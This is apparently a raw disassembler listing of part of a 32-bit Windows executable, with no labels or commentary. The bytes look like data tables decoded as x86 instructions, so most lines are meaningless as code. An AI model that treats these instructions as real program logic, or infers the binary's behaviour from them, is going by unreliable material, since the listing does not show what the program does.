  4068d8:	8b 03                	mov    (%ebx),%eax
  4068da:	06                   	push   %es
  4068db:	00 6d 0c             	add    %ch,0xc(%ebp)
  4068de:	25 05 06 00 73       	and    $0x73000605,%eax
  4068e3:	0c 25                	or     $0x25,%al
  4068e5:	05 0e 00 7f 0c       	add    $0xc7f000e,%eax
  4068ea:	0a 04 0e             	or     (%esi,%ecx,1),%al
  4068ed:	00 99 0c 0a 04 06    	add    %bl,0x6040a0c(%ecx)
  4068f3:	00 23                	add    %ah,(%ebx)
  4068f5:	0d 06 0d 06 00       	or     $0x60d06,%eax
  4068fa:	3c 0d                	cmp    $0xd,%al
  4068fc:	06                   	push   %es
  4068fd:	0d 06 00 56 0d       	or     $0xd560006,%eax
  406902:	d1 03                	roll   $1,(%ebx)
  406904:	0e                   	push   %cs
  406905:	00 a5 0d 6e 03 0e    	add    %ah,0xe036e0d(%ebp)
  40690b:	00 b5 0d 6e 03 06    	add    %dh,0x6036e0d(%ebp)
  406911:	00 e2                	add    %ah,%dl
  406913:	0d 8a 01 0e 00       	or     $0xe018a,%eax
  406918:	e7 0d                	out    %eax,$0xd
  40691a:	6e                   	outsb  %ds:(%esi),(%dx)
  40691b:	03 06                	add    (%esi),%eax
  40691d:	00 fb                	add    %bh,%bl
  40691f:	0d 25 05 0e 00       	or     $0xe0525,%eax
  406924:	4a                   	dec    %edx
  406925:	0e                   	push   %cs
  406926:	34 0e                	xor    $0xe,%al
  406928:	0e                   	push   %cs
  406929:	00 55 0e             	add    %dl,0xe(%ebp)
  40692c:	34 0e                	xor    $0xe,%al
  40692e:	06                   	push   %es
  40692f:	00 77 0e             	add    %dh,0xe(%edi)
  406932:	8a 01                	mov    (%ecx),%al
  406934:	12 00                	adc    (%eax),%al
  406936:	8c 0e                	mov    %cs,(%esi)
  406938:	2f                   	das
  406939:	07                   	pop    %es
  40693a:	0a 00                	or     (%eax),%al
  40693c:	b4 0e                	mov    $0xe,%ah
  40693e:	d7                   	xlat   %ds:(%ebx)
  40693f:	01 0a                	add    %ecx,(%edx)
  406941:	00 d8                	add    %bl,%al
  406943:	0e                   	push   %cs
  406944:	4b                   	dec    %ebx
  406945:	01 06                	add    %eax,(%esi)
  406947:	00 0c 0f             	add    %cl,(%edi,%ecx,1)
  40694a:	8a 01                	mov    (%ecx),%al
  40694c:	06                   	push   %es
  40694d:	00 19                	add    %bl,(%ecx)
  40694f:	0f ad 04 06          	shrd   %cl,%eax,(%esi,%eax,1)
  406953:	00 3e                	add    %bh,(%esi)
  406955:	0f 8a 01 06 00 50    	jp     0x50406f5c
  40695b:	0f 8a 01 06 00 5d    	jp     0x5d406f62
  406961:	0f 8a 01 06 00 86    	jp     0x86406f68
  406967:	0f 6b 0f             	packssdw (%edi),%mm1
  40696a:	00 00                	add    %al,(%eax)
  40696c:	00 00                	add    %al,(%eax)
  40696e:	01 00                	add    %eax,(%eax)
  406970:	00 00                	add    %al,(%eax)
  406972:	00 00                	add    %al,(%eax)
  406974:	01 00                	add    %eax,(%eax)
  406976:	01 00                	add    %eax,(%eax)
  406978:	00 00                	add    %al,(%eax)
  40697a:	00 00                	add    %al,(%eax)
  40697c:	0b 10                	or     (%eax),%edx
  40697e:	19 10                	sbb    %edx,(%eax)
  406980:	0d 00 01 00 01       	or     $0x1000100,%eax
  406985:	00 00                	add    %al,(%eax)
  406987:	00 00                	add    %al,(%eax)
  406989:	00 1e                	add    %bl,(%esi)
  40698b:	10 19                	adc    %bl,(%ecx)
  40698d:	10 21                	adc    %ah,(%ecx)
  40698f:	00 01                	add    %al,(%ecx)
  406991:	00 02                	add    %al,(%edx)
  406993:	00 00                	add    %al,(%eax)
  406995:	01 10                	add    %edx,(%eax)
  406997:	00 29                	add    %ch,(%ecx)
  406999:	10 19                	adc    %bl,(%ecx)
  40699b:	10 29                	adc    %ch,(%ecx)
  40699d:	00 01                	add    %al,(%ecx)
  40699f:	00 03                	add    %al,(%ebx)
  4069a1:	00 05 01 00 00 33    	add    %al,0x33000001
  4069a7:	10 00                	adc    %al,(%eax)
  4069a9:	00 29                	add    %ch,(%ecx)
  4069ab:	00 05 00 08 00 05    	add    %al,0x5000800
  4069b1:	01 00                	add    %eax,(%eax)
  4069b3:	00 41 10             	add    %al,0x10(%ecx)
  4069b6:	00 00                	add    %al,(%eax)
  4069b8:	29 00                	sub    %eax,(%eax)
  4069ba:	05 00 0f 00 01       	add    $0x1000f00,%eax
  4069bf:	00 00                	add    %al,(%eax)
  4069c1:	00 5e 10             	add    %bl,0x10(%esi)
  4069c4:	60                   	pusha
  4069c5:	10 29                	adc    %ch,(%ecx)
  4069c7:	00 06                	add    %al,(%esi)
  4069c9:	00 11                	add    %dl,(%ecx)
  4069cb:	00 01                	add    %al,(%ecx)
  4069cd:	00 10                	add    %dl,(%eax)
  4069cf:	00 62 10             	add    %ah,0x10(%edx)
  4069d2:	60                   	pusha
  4069d3:	10 29                	adc    %ch,(%ecx)
  4069d5:	00 06                	add    %al,(%esi)
  4069d7:	00 13                	add    %dl,(%ebx)
  4069d9:	00 01                	add    %al,(%ecx)
  4069db:	00 00                	add    %al,(%eax)
  4069dd:	00 65 10             	add    %ah,0x10(%ebp)
  4069e0:	60                   	pusha
  4069e1:	10 29                	adc    %ch,(%ecx)
  4069e3:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4069e6:	3e 00 01             	add    %al,%ds:(%ecx)
  4069e9:	00 00                	add    %al,(%eax)
  4069eb:	00 68 10             	add    %ch,0x10(%eax)
  4069ee:	60                   	pusha
  4069ef:	10 29                	adc    %ch,(%ecx)
  4069f1:	00 31                	add    %dh,(%ecx)
  4069f3:	00 49 00             	add    %cl,0x0(%ecx)
  4069f6:	03 01                	add    (%ecx),%eax
  4069f8:	00 00                	add    %al,(%eax)
  4069fa:	6c                   	insb   (%dx),%es:(%edi)
  4069fb:	10 00                	adc    %al,(%eax)
  4069fd:	00 e5                	add    %ah,%ch
  4069ff:	01 32                	add    %esi,(%edx)
  406a01:	00 55 00             	add    %dl,0x0(%ebp)
  406a04:	03 01                	add    (%ecx),%eax
  406a06:	00 00                	add    %al,(%eax)
  406a08:	79 10                	jns    0x406a1a
  406a0a:	00 00                	add    %al,(%eax)
  406a0c:	e5 01                	in     $0x1,%eax
  406a0e:	32 00                	xor    (%eax),%al
  406a10:	59                   	pop    %ecx
  406a11:	00 31                	add    %dh,(%ecx)
  406a13:	00 8b 10 b3 04 31    	add    %cl,0x3104b310(%ebx)
  406a19:	00 a4 10 bb 04 31 00 	add    %ah,0x3104bb(%eax,%edx,1)
  406a20:	b8 10 c3 04 31       	mov    $0x3104c310,%eax
  406a25:	00 cd                	add    %cl,%ch
  406a27:	10 cb                	adc    %cl,%bl
  406a29:	04 11                	add    $0x11,%al
  406a2b:	00 00                	add    %al,(%eax)
  406a2d:	03 51 00             	add    0x0(%ecx),%edx
  406a30:	16                   	push   %ss
  406a31:	00 67 11             	add    %ah,0x11(%edi)
  406a34:	fc                   	cld
  406a35:	04 16                	add    $0x16,%al
  406a37:	00 6b 11             	add    %ch,0x11(%ebx)
  406a3a:	fc                   	cld
  406a3b:	04 16                	add    $0x16,%al
  406a3d:	00 71 11             	add    %dh,0x11(%ecx)
  406a40:	ff 04 16             	incl   (%esi,%edx,1)
  406a43:	00 77 11             	add    %dh,0x11(%edi)
  406a46:	02 05 11 00 7b 11    	add    0x117b0011,%al
  406a4c:	05 05 16 00 7d       	add    $0x7d001605,%eax
  406a51:	11 02                	adc    %eax,(%edx)
  406a53:	05 16 00 80 11       	add    $0x11800016,%eax
  406a58:	09 05 16 00 82 11    	or     %eax,0x11820016
  406a5e:	02 05 16 00 85 11    	add    0x11850016,%al
  406a64:	fc                   	cld
  406a65:	04 16                	add    $0x16,%al
  406a67:	00 88 11 fc 04 16    	add    %cl,0x1604fc11(%eax)
  406a6d:	00 8c 11 0d 05 16 00 	add    %cl,0x16050d(%ecx,%edx,1)
  406a74:	8e 11                	mov    (%ecx),%ss
  406a76:	11 05 11 00 91 11    	adc    %eax,0x11910011
  406a7c:	fc                   	cld
  406a7d:	04 16                	add    $0x16,%al
  406a7f:	00 93 11 fc 04 16    	add    %dl,0x1604fc11(%ebx)
  406a85:	00 96 11 02 05 16    	add    %dl,0x16050211(%esi)
  406a8b:	00 9a 11 02 05 16    	add    %bl,0x16050211(%edx)
  406a91:	00 9e 11 02 05 16    	add    %bl,0x16050211(%esi)
  406a97:	00 a2 11 15 05 11    	add    %ah,0x11051511(%edx)
  406a9d:	00 a5 11 fc 04 16    	add    %ah,0x1604fc11(%ebp)
  406aa3:	00 ad 11 19 05 11    	add    %ch,0x11051911(%ebp)
  406aa9:	00 b0 11 1d 05 16    	add    %dh,0x16051d11(%eax)
  406aaf:	00 b4 11 21 05 16 00 	add    %dh,0x160521(%ecx,%edx,1)
  406ab6:	b7 11                	mov    $0x11,%bh
  406ab8:	ff 04 16             	incl   (%esi,%edx,1)
  406abb:	00 ba 11 fc 04 16    	add    %bh,0x1604fc11(%edx)
  406ac1:	00 bc 11 21 05 16 00 	add    %bh,0x160521(%ecx,%edx,1)
  406ac8:	c0 11 fc             	rclb   $0xfc,(%ecx)
  406acb:	04 16                	add    $0x16,%al
  406acd:	00 c3                	add    %al,%bl
  406acf:	11 fc                	adc    %edi,%esp
  406ad1:	04 16                	add    $0x16,%al
  406ad3:	00 c6                	add    %al,%dh
  406ad5:	11 fc                	adc    %edi,%esp
  406ad7:	04 16                	add    $0x16,%al
  406ad9:	00 cb                	add    %cl,%bl
  406adb:	11 fc                	adc    %edi,%esp
  406add:	04 16                	add    $0x16,%al
  406adf:	00 ce                	add    %cl,%dh
  406ae1:	11 fc                	adc    %edi,%esp
  406ae3:	04 16                	add    $0x16,%al
  406ae5:	00 d1                	add    %dl,%cl
  406ae7:	11 fc                	adc    %edi,%esp
  406ae9:	04 16                	add    $0x16,%al
  406aeb:	00 d3                	add    %dl,%bl
  406aed:	11 02                	adc    %eax,(%edx)
  406aef:	05 16 00 d6 11       	add    $0x11d60016,%eax
  406af4:	fc                   	cld
  406af5:	04 16                	add    $0x16,%al
  406af7:	00 db                	add    %bl,%bl
  406af9:	11 02                	adc    %eax,(%edx)
  406afb:	05 16 00 e1 11       	add    $0x11e10016,%eax
  406b00:	02 05 16 00 e5 11    	add    0x11e50016,%al
  406b06:	fc                   	cld
  406b07:	04 16                	add    $0x16,%al
  406b09:	00 ea                	add    %ch,%dl
  406b0b:	11 02                	adc    %eax,(%edx)
  406b0d:	05 16 00 ef 11       	add    $0x11ef0016,%eax
  406b12:	24 05                	and    $0x5,%al
  406b14:	01 00                	add    %eax,(%eax)
  406b16:	58                   	pop    %eax
  406b17:	15 fc 04 01 00       	adc    $0x104fc,%eax
  406b1c:	5f                   	pop    %edi
  406b1d:	15 ff 04 01 00       	adc    $0x104ff,%eax
  406b22:	66 15 e3 05          	adc    $0x5e3,%ax
  406b26:	06                   	push   %es
  406b27:	00 6e 15             	add    %ch,0x15(%esi)
  406b2a:	fc                   	cld
  406b2b:	04 06                	add    $0x6,%al
  406b2d:	00 73 15             	add    %dh,0x15(%ebx)
  406b30:	fc                   	cld
  406b31:	04 01                	add    $0x1,%al
  406b33:	00 04 16             	add    %al,(%esi,%edx,1)
  406b36:	16                   	push   %ss
  406b37:	06                   	push   %es
  406b38:	50                   	push   %eax
  406b39:	20 00                	and    %al,(%eax)
  406b3b:	00 00                	add    %al,(%eax)
  406b3d:	00 06                	add    %al,(%esi)
  406b3f:	18 4a 00             	sbb    %cl,0x0(%edx)
  406b42:	06                   	push   %es
  406b43:	00 01                	add    %al,(%ecx)
  406b45:	00 5a 20             	add    %bl,0x20(%edx)
  406b48:	00 00                	add    %al,(%eax)
  406b4a:	00 00                	add    %al,(%eax)
  406b4c:	06                   	push   %es
  406b4d:	18 4a 00             	sbb    %cl,0x0(%edx)
  406b50:	06                   	push   %es
  406b51:	00 01                	add    %al,(%ecx)
  406b53:	00 65 20             	add    %ah,0x20(%ebp)
  406b56:	00 00                	add    %al,(%eax)
  406b58:	00 00                	add    %al,(%eax)
  406b5a:	11 18                	adc    %ebx,(%eax)
  406b5c:	eb 10                	jmp    0x406b6e
  406b5e:	af                   	scas   %es:(%edi),%eax
  406b5f:	00 01                	add    %al,(%ecx)
  406b61:	00 90 20 00 00 00    	add    %dl,0x20(%eax)
  406b67:	00 13                	add    %dl,(%ebx)
  406b69:	08 f2                	or     %dh,%dl
  406b6b:	10 d3                	adc    %dl,%bl
  406b6d:	04 01                	add    $0x1,%al
  406b6f:	00 ac 20 00 00 00 00 	add    %ch,0x0(%eax,%eiz,1)
  406b76:	13 08                	adc    (%eax),%ecx
  406b78:	ff 10                	call   *(%eax)
  406b7a:	d8 04 01             	fadds  (%ecx,%eax,1)
  406b7d:	00 c8                	add    %cl,%al
  406b7f:	20 00                	and    %al,(%eax)
  406b81:	00 00                	add    %al,(%eax)
  406b83:	00 13                	add    %dl,(%ebx)
  406b85:	08 0f                	or     %cl,(%edi)
  406b87:	11 dd                	adc    %ebx,%ebp
  406b89:	04 01                	add    $0x1,%al
  406b8b:	00 e4                	add    %ah,%ah
  406b8d:	20 00                	and    %al,(%eax)
  406b8f:	00 00                	add    %al,(%eax)
  406b91:	00 13                	add    %dl,(%ebx)
  406b93:	08 18                	or     %bl,(%eax)
  406b95:	11 e2                	adc    %esp,%edx
  406b97:	04 01                	add    $0x1,%al
  406b99:	00 00                	add    %al,(%eax)
  406b9b:	21 00                	and    %eax,(%eax)
  406b9d:	00 00                	add    %al,(%eax)
  406b9f:	00 46 02             	add    %al,0x2(%esi)
  406ba2:	3e 02 23             	add    %ds:(%ebx),%ah
  406ba5:	00 01                	add    %al,(%ecx)
  406ba7:	00 20                	add    %ah,(%eax)
  406ba9:	21 00                	and    %eax,(%eax)
  406bab:	00 00                	add    %al,(%eax)
  406bad:	00 46 02             	add    %al,0x2(%esi)
  406bb0:	45                   	inc    %ebp
  406bb1:	02 28                	add    (%eax),%ch
  406bb3:	00 02                	add    %al,(%edx)
  406bb5:	00 38                	add    %bh,(%eax)
  406bb7:	21 00                	and    %eax,(%eax)
  406bb9:	00 00                	add    %al,(%eax)
  406bbb:	00 83 00 2a 11 e7    	add    %al,-0x18eed600(%ebx)
  406bc1:	04 02                	add    $0x2,%al
  406bc3:	00 54 21 00          	add    %dl,0x0(%ecx,%eiz,1)
  406bc7:	00 00                	add    %al,(%eax)
  406bc9:	00 46 02             	add    %al,0x2(%esi)
  406bcc:	7a 02                	jp     0x406bd0
  406bce:	33 00                	xor    (%eax),%eax
  406bd0:	02 00                	add    (%eax),%al
  406bd2:	6c                   	insb   (%dx),%es:(%edi)
  406bd3:	21 00                	and    %eax,(%eax)
  406bd5:	00 00                	add    %al,(%eax)
  406bd7:	00 11                	add    %dl,(%ecx)
  406bd9:	00 32                	add    %dh,(%edx)
  406bdb:	11 ec                	adc    %ebp,%esp
  406bdd:	04 02                	add    $0x2,%al
  406bdf:	00 98 21 00 00 00    	add    %bl,0x21(%eax)
  406be5:	00 01                	add    %al,(%ecx)
  406be7:	00 4e 11             	add    %cl,0x11(%esi)
  406bea:	f4                   	hlt
  406beb:	04 03                	add    $0x3,%al
  406bed:	00 b6 21 00 00 00    	add    %dh,0x21(%esi)
  406bf3:	00 06                	add    %al,(%esi)
  406bf5:	18 4a 00             	sbb    %cl,0x0(%edx)
  406bf8:	06                   	push   %es
  406bf9:	00 04 00             	add    %al,(%eax,%eax,1)
  406bfc:	c4 21                	les    (%ecx),%esp
  406bfe:	00 00                	add    %al,(%eax)
  406c00:	00 00                	add    %al,(%eax)
  406c02:	03 08                	add    (%eax),%ecx
  406c04:	19 03                	sbb    %eax,(%ebx)
  406c06:	79 00                	jns    0x406c08
  406c08:	04 00                	add    $0x0,%al
  406c0a:	f6 21                	mulb   (%ecx)
  406c0c:	00 00                	add    %al,(%eax)
  406c0e:	00 00                	add    %al,(%eax)
  406c10:	06                   	push   %es
  406c11:	18 4a 00             	sbb    %cl,0x0(%edx)
  406c14:	06                   	push   %es
  406c15:	00 04 00             	add    %al,(%eax,%eax,1)
  406c18:	01 22                	add    %esp,(%edx)
  406c1a:	00 00                	add    %al,(%eax)
  406c1c:	00 00                	add    %al,(%eax)
  406c1e:	06                   	push   %es
  406c1f:	18 4a 00             	sbb    %cl,0x0(%edx)
  406c22:	06                   	push   %es
  406c23:	00 04 00             	add    %al,(%eax,%eax,1)
  406c26:	0b 22                	or     (%edx),%esp
  406c28:	00 00                	add    %al,(%eax)
  406c2a:	00 00                	add    %al,(%eax)
  406c2c:	16                   	push   %ss
  406c2d:	00 62 11             	add    %ah,0x11(%edx)
  406c30:	af                   	scas   %es:(%edi),%eax
  406c31:	00 04 00             	add    %al,(%eax,%eax,1)
  406c34:	18 22                	sbb    %ah,(%edx)
  406c36:	00 00                	add    %al,(%eax)
  406c38:	00 00                	add    %al,(%eax)
  406c3a:	11 18                	adc    %ebx,(%eax)
  406c3c:	eb 10                	jmp    0x406c4e
  406c3e:	af                   	scas   %es:(%edi),%eax
  406c3f:	00 04 00             	add    %al,(%eax,%eax,1)
  406c42:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406c43:	23 00                	and    (%eax),%eax
  406c45:	00 00                	add    %al,(%eax)
  406c47:	00 06                	add    %al,(%esi)
  406c49:	18 4a 00             	sbb    %cl,0x0(%edx)
  406c4c:	06                   	push   %es
  406c4d:	00 04 00             	add    %al,(%eax,%eax,1)
  406c50:	ae                   	scas   %es:(%edi),%al
  406c51:	23 00                	and    (%eax),%eax
  406c53:	00 00                	add    %al,(%eax)
  406c55:	00 11                	add    %dl,(%ecx)
  406c57:	00 f2                	add    %dh,%dl
  406c59:	11 d1                	adc    %edx,%ecx
  406c5b:	00 04 00             	add    %al,(%eax,%eax,1)
  406c5e:	be 23 00 00 00       	mov    $0x23,%esi
  406c63:	00 11                	add    %dl,(%ecx)
  406c65:	00 f2                	add    %dh,%dl
  406c67:	11 28                	adc    %ebp,(%eax)
  406c69:	05 05 00 c8 23       	add    $0x23c80005,%eax
  406c6e:	00 00                	add    %al,(%eax)
  406c70:	00 00                	add    %al,(%eax)
  406c72:	16                   	push   %ss
  406c73:	00 fb                	add    %bh,%bl
  406c75:	11 9a 01 07 00 50    	adc    %ebx,0x50000701(%edx)
  406c7b:	24 00                	and    $0x0,%al
  406c7d:	00 00                	add    %al,(%eax)
  406c7f:	00 16                	add    %dl,(%esi)
  406c81:	00 ff                	add    %bh,%bh
  406c83:	11 2f                	adc    %ebp,(%edi)
  406c85:	05 07 00 70 24       	add    $0x24700007,%eax
  406c8a:	00 00                	add    %al,(%eax)
  406c8c:	00 00                	add    %al,(%eax)
  406c8e:	16                   	push   %ss
  406c8f:	00 04 12             	add    %al,(%edx,%edx,1)
  406c92:	36 05 08 00 00 00    	ss add $0x8,%eax
  406c98:	00 00                	add    %al,(%eax)
  406c9a:	80 00 16             	addb   $0x16,(%eax)
  406c9d:	20 08                	and    %cl,(%eax)
  406c9f:	12 3a                	adc    (%edx),%bh
  406ca1:	05 08 00 00 00       	add    $0x8,%eax
  406ca6:	00 00                	add    %al,(%eax)
  406ca8:	80 00 11             	addb   $0x11,(%eax)
  406cab:	20 1c 12             	and    %bl,(%edx,%edx,1)
  406cae:	3e 05 08 00 00 00    	ds add $0x8,%eax
  406cb4:	00 00                	add    %al,(%eax)
  406cb6:	80 00 16             	addb   $0x16,(%eax)
  406cb9:	20 e4                	and    %ah,%ah
  406cbb:	12 52 05             	adc    0x5(%edx),%dl
  406cbe:	10 00                	adc    %al,(%eax)
  406cc0:	00 00                	add    %al,(%eax)
  406cc2:	00 00                	add    %al,(%eax)
  406cc4:	80 00 16             	addb   $0x16,(%eax)
  406cc7:	20 19                	and    %bl,(%ecx)
  406cc9:	13 5a 05             	adc    0x5(%edx),%ebx
  406ccc:	13 00                	adc    (%eax),%eax
  406cce:	00 00                	add    %al,(%eax)
  406cd0:	00 00                	add    %al,(%eax)
  406cd2:	80 00 16             	addb   $0x16,(%eax)
  406cd5:	20 47 13             	and    %al,0x13(%edi)
  406cd8:	5f                   	pop    %edi
  406cd9:	05 14 00 e4 24       	add    $0x24e40014,%eax
  406cde:	00 00                	add    %al,(%eax)
  406ce0:	00 00                	add    %al,(%eax)
  406ce2:	11 00                	adc    %eax,(%eax)
  406ce4:	86 13                	xchg   %dl,(%ebx)
  406ce6:	6a 05                	push   $0x5
  406ce8:	19 00                	sbb    %eax,(%eax)
  406cea:	90                   	nop
  406ceb:	25 00 00 00 00       	and    $0x0,%eax
  406cf0:	16                   	push   %ss
  406cf1:	00 94 13 36 05 1b 00 	add    %dl,0x1b0536(%ebx,%edx,1)
  406cf8:	b0 29                	mov    $0x29,%al
  406cfa:	00 00                	add    %al,(%eax)
  406cfc:	00 00                	add    %al,(%eax)
  406cfe:	16                   	push   %ss
  406cff:	00 9c 13 72 05 1b 00 	add    %bl,0x1b0572(%ebx,%edx,1)
  406d06:	d4 29                	aam    $0x29
  406d08:	00 00                	add    %al,(%eax)
  406d0a:	00 00                	add    %al,(%eax)
  406d0c:	16                   	push   %ss
  406d0d:	00 a2 13 e8 02 1c    	add    %ah,0x1c02e813(%edx)
  406d13:	00 34 2a             	add    %dh,(%edx,%ebp,1)
  406d16:	00 00                	add    %al,(%eax)
  406d18:	00 00                	add    %al,(%eax)
  406d1a:	16                   	push   %ss
  406d1b:	00 a8 13 af 00 1d    	add    %ch,0x1d00af13(%eax)
  406d21:	00 40 2a             	add    %al,0x2a(%eax)
  406d24:	00 00                	add    %al,(%eax)
  406d26:	00 00                	add    %al,(%eax)
  406d28:	16                   	push   %ss
  406d29:	00 ab 13 72 05 1d    	add    %ch,0x1d057213(%ebx)
  406d2f:	00 60 2a             	add    %ah,0x2a(%eax)
  406d32:	00 00                	add    %al,(%eax)
  406d34:	00 00                	add    %al,(%eax)
  406d36:	16                   	push   %ss
  406d37:	00 af 13 78 05 1e    	add    %ch,0x1e057813(%edi)
  406d3d:	00 dc                	add    %bl,%ah
  406d3f:	2a 00                	sub    (%eax),%al
  406d41:	00 00                	add    %al,(%eax)
  406d43:	00 16                	add    %dl,(%esi)
  406d45:	00 b7 13 9a 01 20    	add    %dh,0x20019a13(%edi)
  406d4b:	00 68 2b             	add    %ch,0x2b(%eax)
  406d4e:	00 00                	add    %al,(%eax)
  406d50:	00 00                	add    %al,(%eax)
  406d52:	16                   	push   %ss
  406d53:	00 bb 13 7e 05 20    	add    %bh,0x20057e13(%ebx)
  406d59:	00 00                	add    %al,(%eax)
  406d5b:	00 00                	add    %al,(%eax)
  406d5d:	00 80 00 16 20 be    	add    %al,-0x41dfea00(%eax)
  406d63:	13 83 05 21 00 00    	adc    0x2105(%ebx),%eax
  406d69:	00 00                	add    %al,(%eax)
  406d6b:	00 80 00 16 20 de    	add    %al,-0x21dfea00(%eax)
  406d71:	13 88 05 22 00 00    	adc    0x2205(%eax),%ecx
  406d77:	00 00                	add    %al,(%eax)
  406d79:	00 80 00 11 20 f4    	add    %al,-0xbdfef00(%eax)
  406d7f:	13 8d 05 23 00 00    	adc    0x2305(%ebp),%ecx
  406d85:	00 00                	add    %al,(%eax)
  406d87:	00 80 00 11 20 12    	add    %al,0x12201100(%eax)
  406d8d:	14 95                	adc    $0x95,%al
  406d8f:	05 27 00 00 00       	add    $0x27,%eax
  406d94:	00 00                	add    %al,(%eax)
  406d96:	80 00 16             	addb   $0x16,(%eax)
  406d99:	20 40 14             	and    %al,0x14(%eax)
  406d9c:	a0 05 2e 00 00       	mov    0x2e05,%al
  406da1:	00 00                	add    %al,(%eax)
  406da3:	00 80 00 16 20 97    	add    %al,-0x68dfea00(%eax)
  406da9:	14 aa                	adc    $0xaa,%al
  406dab:	05 32 00 a8 2b       	add    $0x2ba80032,%eax
  406db0:	00 00                	add    %al,(%eax)
  406db2:	00 00                	add    %al,(%eax)
  406db4:	16                   	push   %ss
  406db5:	00 a5 14 e8 02 34    	add    %ah,0x3402e814(%ebp)
  406dbb:	00 d8                	add    %bl,%al
  406dbd:	2b 00                	sub    (%eax),%eax
  406dbf:	00 08                	add    %cl,(%eax)
  406dc1:	00 16                	add    %dl,(%esi)
  406dc3:	00 b2 14 b0 05 35    	add    %dh,0x3505b014(%edx)
  406dc9:	00 68 46             	add    %ch,0x46(%eax)
  406dcc:	00 00                	add    %al,(%eax)
  406dce:	00 00                	add    %al,(%eax)
  406dd0:	16                   	push   %ss
  406dd1:	00 b6 14 9a 01 36    	add    %dh,0x36019a14(%esi)
  406dd7:	00 f4                	add    %dh,%ah
  406dd9:	4a                   	dec    %edx
  406dda:	00 00                	add    %al,(%eax)
  406ddc:	08 00                	or     %al,(%eax)
  406dde:	16                   	push   %ss
  406ddf:	00 ba 14 af 00 36    	add    %bh,0x3600af14(%edx)
  406de5:	00 78 4f             	add    %bh,0x4f(%eax)
  406de8:	00 00                	add    %al,(%eax)
  406dea:	08 00                	or     %al,(%eax)
  406dec:	16                   	push   %ss
  406ded:	00 be 14 af 00 36    	add    %bh,0x3600af14(%esi)
  406df3:	00 d8                	add    %bl,%al
  406df5:	53                   	push   %ebx
  406df6:	00 00                	add    %al,(%eax)
  406df8:	00 00                	add    %al,(%eax)
  406dfa:	16                   	push   %ss
  406dfb:	00 c1                	add    %al,%cl
  406dfd:	14 2c                	adc    $0x2c,%al
  406dff:	01 36                	add    %esi,(%esi)
  406e01:	00 00                	add    %al,(%eax)
  406e03:	00 00                	add    %al,(%eax)
  406e05:	00 80 00 11 20 c5    	add    %al,-0x3adfef00(%eax)
  406e0b:	14 b6                	adc    $0xb6,%al
  406e0d:	05 37 00 30 54       	add    $0x54300037,%eax
  406e12:	00 00                	add    %al,(%eax)
  406e14:	00 00                	add    %al,(%eax)
  406e16:	16                   	push   %ss
  406e17:	00 2a                	add    %ch,(%edx)
  406e19:	15 bf 05 3b 00       	adc    $0x3b05bf,%eax
  406e1e:	cc                   	int3
  406e1f:	54                   	push   %esp
  406e20:	00 00                	add    %al,(%eax)
  406e22:	00 00                	add    %al,(%eax)
  406e24:	16                   	push   %ss
  406e25:	00 33                	add    %dh,(%ebx)
  406e27:	15 cc 00 3d 00       	adc    $0x3d00cc,%eax
  406e2c:	14 55                	adc    $0x55,%al
  406e2e:	00 00                	add    %al,(%eax)
  406e30:	00 00                	add    %al,(%eax)
  406e32:	16                   	push   %ss
  406e33:	00 38                	add    %bh,(%eax)
  406e35:	15 af 00 3e 00       	adc    $0x3e00af,%eax
  406e3a:	18 58 00             	sbb    %bl,0x0(%eax)
  406e3d:	00 00                	add    %al,(%eax)
  406e3f:	00 16                	add    %dl,(%esi)
  406e41:	00 3b                	add    %bh,(%ebx)
  406e43:	15 c6 05 3e 00       	adc    $0x3e05c6,%eax
  406e48:	38 58 00             	cmp    %bl,0x0(%eax)
  406e4b:	00 00                	add    %al,(%eax)
  406e4d:	00 16                	add    %dl,(%esi)
  406e4f:	00 22                	add    %ah,(%edx)
  406e51:	0e                   	push   %cs
  406e52:	83 00 3f             	addl   $0x3f,(%eax)
  406e55:	00 58 58             	add    %bl,0x58(%eax)
  406e58:	00 00                	add    %al,(%eax)
  406e5a:	00 00                	add    %al,(%eax)
  406e5c:	16                   	push   %ss
  406e5d:	00 40 15             	add    %al,0x15(%eax)
  406e60:	cd 05                	int    $0x5
  406e62:	40                   	inc    %eax
  406e63:	00 94 59 00 00 00 00 	add    %dl,0x0(%ecx,%ebx,2)
  406e6a:	16                   	push   %ss
  406e6b:	00 46 15             	add    %al,0x15(%esi)
  406e6e:	d3 05 41 00 14 5a    	roll   %cl,0x5a140041
  406e74:	00 00                	add    %al,(%eax)
  406e76:	08 00                	or     %al,(%eax)
  406e78:	16                   	push   %ss
  406e79:	00 50 15             	add    %dl,0x15(%eax)
  406e7c:	af                   	scas   %es:(%edi),%eax
  406e7d:	00 44 00 3c          	add    %al,0x3c(%eax,%eax,1)
  406e81:	5c                   	pop    %esp
  406e82:	00 00                	add    %al,(%eax)
  406e84:	00 00                	add    %al,(%eax)
  406e86:	16                   	push   %ss
  406e87:	00 54 15 dc          	add    %dl,-0x24(%ebp,%edx,1)
  406e8b:	05 44 00 bc 5c       	add    $0x5cbc0044,%eax
  406e90:	00 00                	add    %al,(%eax)
  406e92:	00 00                	add    %al,(%eax)
  406e94:	06                   	push   %es
  406e95:	18 4a 00             	sbb    %cl,0x0(%edx)
  406e98:	06                   	push   %es
  406e99:	00 45 00             	add    %al,0x0(%ebp)
  406e9c:	e4 5c                	in     $0x5c,%al
  406e9e:	00 00                	add    %al,(%eax)
  406ea0:	00 00                	add    %al,(%eax)
  406ea2:	01 00                	add    %eax,(%eax)
  406ea4:	76 15                	jbe    0x406ebb
  406ea6:	33 00                	xor    (%eax),%eax
  406ea8:	45                   	inc    %ebp
  406ea9:	00 fc                	add    %bh,%ah
  406eab:	5d                   	pop    %ebp
  406eac:	00 00                	add    %al,(%eax)
  406eae:	00 00                	add    %al,(%eax)
  406eb0:	01 00                	add    %eax,(%eax)
  406eb2:	79 15                	jns    0x406ec9
  406eb4:	e8 05 45 00 00       	call   0x40b3be
  406eb9:	00 00                	add    %al,(%eax)
  406ebb:	00 80 00 11 20 7f    	add    %al,0x7f201100(%eax)
  406ec1:	15 ef 05 46 00       	adc    $0x4605ef,%eax
  406ec6:	00 00                	add    %al,(%eax)
  406ec8:	00 00                	add    %al,(%eax)
  406eca:	80 00 11             	addb   $0x11,(%eax)
  406ecd:	20 92 15 83 05 47    	and    %dl,0x47058315(%edx)
  406ed3:	00 00                	add    %al,(%eax)
  406ed5:	00 00                	add    %al,(%eax)
  406ed7:	00 80 00 11 20 a4    	add    %al,-0x5bdfef00(%eax)
  406edd:	15 cd 05 48 00       	adc    $0x4805cd,%eax
